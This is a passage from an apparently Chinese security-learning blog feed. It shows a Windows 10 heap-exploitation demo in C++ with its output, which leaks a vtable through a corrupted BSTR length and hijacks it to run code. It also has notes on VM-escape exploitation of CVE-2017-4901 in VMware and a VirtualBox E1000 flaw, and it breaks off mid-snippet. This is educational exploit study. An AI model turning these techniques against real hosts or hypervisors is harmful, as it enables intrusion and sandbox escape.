class="string">L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"BSTR string : 0x%08x\n"</span>, bstr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] free chunk at 0x%08x\n"</span>, <span class="number">6</span>, chunk[<span class="number">6</span>]);</span><br><span class="line">    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, chunk[<span class="number">6</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> addr_foo_object = (<span class="keyword">int</span>)fooObject;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Foo Object at 0x%08x\n"</span>, addr_foo_object);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array0(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array1(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array2(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array3(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array4(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array5(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array6(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array7(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array8(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array9(<span class="number">40</span>, addr_foo_object);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"BSTR string[-2] : %d\n"</span>, bstr[<span class="number">-2</span>]);</span><br><span class="line">    bstr[<span class="number">-2</span>] = <span class="number">256</span>;</span><br><span class="line">    <span class="keyword">int</span> vtable = bstr[<span class="number">131</span>] &lt;&lt; <span class="number">16</span> | bstr[<span class="number">130</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"vtable addr 0x%08x\n"</span>, vtable);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[ 0] alloc chunk at 0x00a20968</span><br><span class="line">[ 1] alloc chunk at 0x00a27d38</span><br><span class="line">[ 2] alloc chunk at 0x00a27ed0</span><br><span class="line">[ 3] alloc chunk at 0x00a28068</span><br><span class="line">[ 4] alloc chunk at 0x00a28200</span><br><span class="line">[ 5] alloc chunk at 0x00a28398</span><br><span class="line">[ 6] alloc chunk at 0x00a28530</span><br><span class="line">[ 7] alloc chunk at 0x00a286c8</span><br><span class="line">[ 8] alloc chunk at 0x00a28860</span><br><span class="line">[ 9] alloc chunk at 0x00a289f8</span><br><span class="line">[10] alloc chunk at 0x00a28b90</span><br><span class="line">[11] alloc chunk at 0x00a28d28</span><br><span class="line">[12] alloc chunk at 0x00a24d08</span><br><span class="line">[13] alloc chunk at 0x00a24ea0</span><br><span class="line">[14] alloc chunk at 0x00a25038</span><br><span class="line">[15] alloc chunk at 0x00a251d0</span><br><span class="line">[16] alloc chunk at 0x00a25368</span><br><span class="line">[17] alloc chunk at 0x00a29878</span><br><span class="line">[5] free chunk at 0x00a28398</span><br><span class="line">BSTR string : 0x00a2839c</span><br><span class="line">[6] free chunk at 0x00a28530</span><br><span class="line">Foo Object at 0x00a12d50</span><br><span class="line">BSTR string[-2] : 248</span><br><span class="line">vtable addr 0x00a12d50</span><br></pre></td></tr></table></figure><p>可以看到成功输出了vtable。</p><h3 id="信息泄露之后，任意代码执行"><a href="#信息泄露之后，任意代码执行" class="headerlink" title="信息泄露之后，任意代码执行"></a>信息泄露之后，任意代码执行</h3><p>通过以上操作我们已经可以任意地址读了，再结合这个溢出的任意地址写，就可以改vtable来任意代码执行了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;comdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_SIZE 0x190</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">LPVOID chunk[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooObject</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    FooObject() &#123;&#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~FooObject() &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Destructor!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"shell!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> args, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    BSTR bstr;</span><br><span class="line">    FooObject* fooObject = <span class="keyword">new</span> FooObject();</span><br><span class="line"></span><br><span class="line">    HANDLE defaultHeap = GetProcessHeap();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Trigger LFH</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++) &#123;</span><br><span class="line">        chunk[i] = HeapAlloc(defaultHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line">        <span class="comment">// printf("[%2d] alloc chunk at 0x%08x\n", i, chunk[i]);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] free chunk at 0x%08x\n"</span>, <span class="number">5</span>, chunk[<span class="number">5</span>]);</span><br><span class="line">    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">    bstr = SysAllocString(<span class="string">L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"BSTR string : 0x%08x\n"</span>, bstr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] free chunk at 0x%08x\n"</span>, <span class="number">6</span>, chunk[<span class="number">6</span>]);</span><br><span class="line">    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, chunk[<span class="number">6</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> addr_foo_object = (<span class="keyword">int</span>)fooObject;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Foo Object at 0x%08x\n"</span>, addr_foo_object);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array0(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array1(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array2(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array3(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array4(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array5(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array6(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array7(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array8(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array9(<span class="number">40</span>, addr_foo_object);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"BSTR string[-2] : %d\n"</span>, bstr[<span class="number">-2</span>]);</span><br><span class="line">    bstr[<span class="number">-2</span>] = <span class="number">256</span>;</span><br><span class="line">    <span class="keyword">int</span> vtable_addr = bstr[<span class="number">131</span>] &lt;&lt; <span class="number">16</span> | bstr[<span class="number">130</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"vtable addr : 0x%08x\n"</span>, vtable_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> vtable = *(<span class="keyword">int</span> *)vtable_addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"vtable : 0x%08x\n"</span>, vtable);</span><br><span class="line"></span><br><span class="line">    DWORD dwOld = <span class="number">0</span>;</span><br><span class="line">    VirtualProtect((<span class="keyword">void</span> *)vtable, <span class="number">0x1000</span>, PAGE_EXECUTE_READWRITE, &amp;dwOld);</span><br><span class="line"></span><br><span class="line">    (*(<span class="keyword">int</span>*)vtable) = (<span class="keyword">int</span>)shell;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fooObject);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到执行结果如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[5] free chunk at 0x007810c0</span><br><span class="line">BSTR string : 0x007810c4</span><br><span class="line">[6] free chunk at 0x00781258</span><br><span class="line">Foo Object at 0x007732c0</span><br><span class="line">BSTR string[-2] : 248</span><br><span class="line">vtable addr : 0x007732c0</span><br><span class="line">vtable : 0x00b63318</span><br><span class="line">shell!</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当然这只是打个样，实际情况要复杂的多，要利用读写原语修改页属性，然后改虚表执行代码，当然虚表也可能改崩，随鸡应变。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Win10堆分配背景知识&quot;&gt;&lt;a href=&quot;#Win10堆分配背景知识&quot; class=&quot;headerlink&quot; title=&quot;Win10堆分配背景知识&quot;&gt;&lt;/a&gt;Win10堆分配背景知识&lt;/h2&gt;&lt;p&gt;Windows不像Linux，有开源代码可以读，微软至今都没
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
      <category term="Base" scheme="https://github.com/Cracke-S-J/categories/CVE/Base/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
      <category term="Base" scheme="https://github.com/Cracke-S-J/tags/Base/"/>
    
  </entry>
  
  <entry>
    <title>VM 逃逸入门学习</title>
    <link href="https://github.com/Cracke-S-J/2020/05/09/vm%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/"/>
    <id>https://github.com/Cracke-S-J/2020/05/09/vm%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/</id>
    <published>2020-05-09T11:08:53.000Z</published>
    <updated>2020-05-26T09:22:22.203Z</updated>
    
    <content type="html"><![CDATA[<p>继Linux内核、浏览器、文档型漏洞，虚拟机应该是最后一块了，（从目前我入门二进制漏洞实战来看。主要是针对VM Ware和Virtual Box。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="在此整理任意读写原语的获取技巧"><a href="#在此整理任意读写原语的获取技巧" class="headerlink" title="在此整理任意读写原语的获取技巧"></a>在此整理任意读写原语的获取技巧</h3><h4 id="读原语"><a href="#读原语" class="headerlink" title="读原语"></a>读原语</h4><p>找一些有读操作的结构，可以通过漏洞利用覆盖字符串结尾\x00读相邻内容，这种一般不能直接任意地址地址泄露，但是可以通过布局内存，泄露出想要的地址。</p><p>任意地址读基本就是修改数组的长度了。</p><p>类型混淆也可以达到读效果，比如把指针当做字符串解析，可以泄露这个指针。</p><h4 id="写原语"><a href="#写原语" class="headerlink" title="写原语"></a>写原语</h4><p>任意地址写可以先用漏洞点修改某个对象的长度，然后用这个对象去覆盖相邻有写操作的对象，达到任意地址写。</p><h4 id="执行shellcode"><a href="#执行shellcode" class="headerlink" title="执行shellcode"></a>执行shellcode</h4><p>shellcode起码要放在rwx的内存页中，要么就是gadgets。</p><p>执行的话，可以任意地址写去修改函数指针、虚表；也可以类型混淆，比如把字符串解析成指针，就可以执行了（注意dep）。</p><h2 id="CVE-2017-4901-利用一个堆溢出漏洞实现-VMware-虚拟机逃逸"><a href="#CVE-2017-4901-利用一个堆溢出漏洞实现-VMware-虚拟机逃逸" class="headerlink" title="CVE-2017-4901 利用一个堆溢出漏洞实现 VMware 虚拟机逃逸"></a>CVE-2017-4901 利用一个堆溢出漏洞实现 VMware 虚拟机逃逸</h2><p><a href="https://paper.seebug.org/348/" target="_blank" rel="noopener">https://paper.seebug.org/348/</a></p><h3 id="VMware-RPCI-机制"><a href="#VMware-RPCI-机制" class="headerlink" title="VMware RPCI 机制"></a>VMware RPCI 机制</h3><p>用这个与host实现通信看下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>  </span><br><span class="line">Backdoor_InOut(Backdoor_proto *myBp) <span class="comment">// IN/OUT  </span></span><br><span class="line">&#123;</span><br><span class="line">   uint64 dummy;</span><br><span class="line"></span><br><span class="line">   __asm__ __volatile__(</span><br><span class="line">#ifdef __APPLE__</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Save %rbx on the stack because the Mac OS GCC doesn't want us to</span></span><br><span class="line"><span class="comment">         * clobber it - it erroneously thinks %rbx is the PIC register.</span></span><br><span class="line"><span class="comment">         * (Radar bug 7304232)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">"pushq %%rbx"</span>           <span class="string">"\n\t"</span></span><br><span class="line">#endif</span><br><span class="line">        <span class="string">"pushq %%rax"</span>           <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq 40(%%rax), %%rdi"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq 32(%%rax), %%rsi"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq 24(%%rax), %%rdx"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq 16(%%rax), %%rcx"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq  8(%%rax), %%rbx"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq   (%%rax), %%rax"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"inl %%dx, %%eax"</span>       <span class="string">"\n\t"</span>  <span class="comment">/* NB: There is no inq instruction */</span></span><br><span class="line">        <span class="string">"xchgq %%rax, (%%rsp)"</span>  <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq %%rdi, 40(%%rax)"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq %%rsi, 32(%%rax)"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq %%rdx, 24(%%rax)"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq %%rcx, 16(%%rax)"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq %%rbx,  8(%%rax)"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"popq          (%%rax)"</span> <span class="string">"\n\t"</span></span><br><span class="line">#ifdef __APPLE__</span><br><span class="line">        <span class="string">"popq %%rbx"</span>            <span class="string">"\n\t"</span></span><br><span class="line">#endif</span><br><span class="line">      : <span class="string">"=a"</span> (dummy)</span><br><span class="line">      : <span class="string">"0"</span> (myBp)</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">       * vmware can modify the whole VM state without the compiler knowing</span></span><br><span class="line"><span class="comment">       * it. So far it does not modify EFLAGS. --hpreg</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      :</span><br><span class="line">#ifndef __APPLE__</span><br><span class="line">      <span class="comment">/* %rbx is unchanged at the end of the function on Mac OS. */</span></span><br><span class="line">      <span class="string">"rbx"</span>,</span><br><span class="line">#endif</span><br><span class="line">      <span class="string">"rcx"</span>, <span class="string">"rdx"</span>, <span class="string">"rsi"</span>, <span class="string">"rdi"</span>, <span class="string">"memory"</span></span><br><span class="line">   );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意<code>inl</code>这个指令，guest是不允许io操作的，它发起io操作，host会产生异常，异常会被捕捉，从而实现通信。</p><h3 id="漏洞点-拖放-DnD-与复制粘贴-CP"><a href="#漏洞点-拖放-DnD-与复制粘贴-CP" class="headerlink" title="漏洞点 拖放(DnD)与复制粘贴(CP)"></a>漏洞点 拖放(DnD)与复制粘贴(CP)</h3><p>对于Version 4的DnD/CP功能，它检查是否越界的时候，只对第一个包有效，后续的包可能越界产生堆溢出。Version 3也是一样的。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>要注意的是，因为有这个溢出，我们已经可以任意地址写了，所以要做的是进行信息泄露，找到要攻击对象的位置，然后决定怎么覆盖个啥。</p><h4 id="绕过ASLR"><a href="#绕过ASLR" class="headerlink" title="绕过ASLR"></a>绕过ASLR</h4><p>需要找一guest可以写并且取回的操作，找到了如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">info-set guestinfo.KEY VALUE</span><br><span class="line">info-get guestinfo.KEY</span><br></pre></td></tr></table></figure><p>我们可以通过溢出来覆盖结尾的null字节，让字符串连接上相邻的内存块。如果我们能够在发生溢出的内存块和DnD或CP对象之间分配一个字符串，那么我们就能泄露对象的vtable地址，从而我们就可以知道vmware-vmx的地址。</p><p>分配一堆字符串，利用溢出改字符，找出被改那个字符串，这样就找到了一个字符串可以被用来读取泄露的数据，然后以0xA8的粒度继续溢出，不断地读，由于DnD和CP对象的vtable距离vmware-vmx基地址的偏移是固定的，只需要检查最低一些数据位，就能够判断溢出是否到达了目标对象。</p><p>此时我们有了目标对象位置。</p><h4 id="覆盖-CopyPaste"><a href="#覆盖-CopyPaste" class="headerlink" title="覆盖 CopyPaste"></a>覆盖 CopyPaste</h4><p>这是要覆盖虚表指针为指向shellcode的恶意函数指针。</p><p>对于 CopyPaste 对象，我们可以覆盖虚表指针，让它指向我们可控的其他数据。我们需要找到一个指针，指针指向的数据是可控并被用做对象的虚表。为此我们使用了另一个 RPCI 命令 unity.window.contents.start。这个命令主要用于 Unity 模式下，在 host 上绘制一些图像。这个操作可以让我们往相对 vmware-vmx 偏移已知的位置写入一些数据。该命令接收的参数是图像的宽度和高度，二者都是32位，合并起来我们就在已知位置获得了一个64位的数据。我们用它来作为虚表中的一个指针，通过发送一个 CopyPast 命令即可触发该虚函数调用，步骤如下：</p><ul><li>发送 unity.window.contents.start 命令，通过指定参数宽度和高度，往全局变量处写入一个64位的栈迁移 gadget 地址</li><li>覆盖对象虚表指针，指向伪造的虚表（调整虚表地址偏移）</li><li>发送 CopyPaste 命令，触发虚函数调用</li><li>ROP</li></ul><h4 id="覆盖-DnD"><a href="#覆盖-DnD" class="headerlink" title="覆盖 DnD"></a>覆盖 DnD</h4><p>先康一眼结构：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DnD_CopyPaste_RpcV3&#123;  </span><br><span class="line">    <span class="keyword">void</span> * vtable;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">uint64_t</span> ifacetype;</span><br><span class="line">    RpcUtil&#123;</span><br><span class="line">        <span class="keyword">void</span> * vtable;</span><br><span class="line">        RpcBase * mRpc;</span><br><span class="line">        DnDTransportBuffer&#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> seqNum;</span><br><span class="line">            <span class="keyword">uint8_t</span> * buffer;</span><br><span class="line">            <span class="keyword">uint64_t</span> totalSize;</span><br><span class="line">            <span class="keyword">uint64_t</span> offset;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RpcBase&#123;  </span><br><span class="line">    <span class="keyword">void</span> * vtable;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于 DnD 对象，我们不能只覆盖 vtable 指针，因为在发生溢出之后 vtable 会立马被访问，另一个虚函数会被调用，而目前我们只能通过 unity 图像的宽度和高度控制一个 qword，所以无法控制更大的虚表。</p><p>对象中有个指针指向另一个C++对象 RpcBase，如果我们能用一个可控数据的指针的指针覆盖 mRpc 这个域，那我们就控制了 RpcBase 的 vtable。对此我们可以继续使用 unity.window.contents.start 命令来来控制 mRpc，该命令的另一个参数是 imgsize，这个参数代表分配的图像 buffer 的大小。这个 buffer 分配出来后，它的地址会存在 vmware-vmx 的固定偏移处。我们可以使用命令 unity.window.contents.chunk 来填充 buffer 的内容。步骤如下：</p><ul><li>发送unity.window.contents.start命令来分配一个buffer，后续我们用它来存储一个伪造的vtable。</li><li>发送unity.window.contents.chunk命令来填充伪造的vtable，其中填入一个栈迁移的gadget</li><li>通过溢出覆盖DnD对象的mRpc域，让它指向存储buffer地址的地方（某全局变量处），即写入一个指针的指针</li><li>通过发送DnD命令来触发mRpc域的虚函数调用</li><li>ROP</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这种几乎能任意长度溢出的漏洞利用起来基本是<code>信息泄露，泄露目标对象位置</code>-&gt;<code>修改操作vtable</code>-&gt;<code>ROP</code>。</p><h2 id="VirtualBox-E1000-0day-虚拟机逃逸漏洞"><a href="#VirtualBox-E1000-0day-虚拟机逃逸漏洞" class="headerlink" title="VirtualBox E1000 0day 虚拟机逃逸漏洞"></a>VirtualBox E1000 0day 虚拟机逃逸漏洞</h2><p><a href="https://www.anquanke.com/post/id/163714" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163714</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>VirtualBox默认虚拟网络设备为上文的82540EM（NAT模式），以下简称E1000。</p><p>E1000存在漏洞，允许guest虚拟机中拥有管理员权限的攻击者转移到主机ring3中，并利用其它方式（/dev/vboxdrv）提权至ring0。</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>网卡驱动逻辑漏洞，因为处理Tx描述符校验有一些问题，可能只校验了三个却循环执行了五个。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">context_1.header_length = 0</span><br><span class="line">context_1.maximum_segment_size = 0x3010</span><br><span class="line">context_1.tcp_segmentation_enabled = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">data_2.data_length = 0x10</span><br><span class="line">data_2.end_of_packet = <span class="literal">false</span></span><br><span class="line">data_2.tcp_segmentation_enabled = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">data_3.data_length = 0</span><br><span class="line">data_3.end_of_packet = <span class="literal">true</span></span><br><span class="line">data_3.tcp_segmentation_enabled = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">context_4.header_length = 0</span><br><span class="line">context_4.maximum_segment_size = 0xF</span><br><span class="line"></span><br><span class="line">context_4.tcp_segmentation_enabled = <span class="literal">true</span></span><br><span class="line">data_5.data_length = 0x4188</span><br><span class="line">data_5.end_of_packet = <span class="literal">true</span></span><br><span class="line">data_5.tcp_segmentation_enabled = <span 